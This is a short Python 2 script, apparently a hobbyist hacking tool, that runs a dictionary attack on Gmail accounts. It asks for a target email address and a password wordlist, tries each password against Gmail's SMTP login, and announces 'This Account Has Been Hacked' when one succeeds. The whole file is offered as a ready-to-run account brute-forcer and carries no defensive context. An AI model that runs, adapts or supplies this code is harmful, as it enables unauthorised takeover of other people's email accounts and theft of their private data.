#!/usr/bin/python
'''create by Cyber Spy'''

import smtplib
from os import system

def main():
   print '=============================='
   print '     \033[1;32;40m create by C9B3R 8P9               '
   print '=============================='
   print '\n                                               '
   print ' ----- \033[1;32;40m CyberSpy -----        '
   print ' ----- \33[1;32;40m youtube.com/CyberSpyes -----  '
   print '       ------------------------- '
   print '\n                                               '
   
main()
print ' |``````````````````````````` '
print ' | [1] start the attack    '
print ' |____________________ '
print ' |```````````` '
print ' | [2] exit     '
print ' |_________ '
option = input('==>')
if option == 1:
   file_path = raw_input('path of passwords file :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
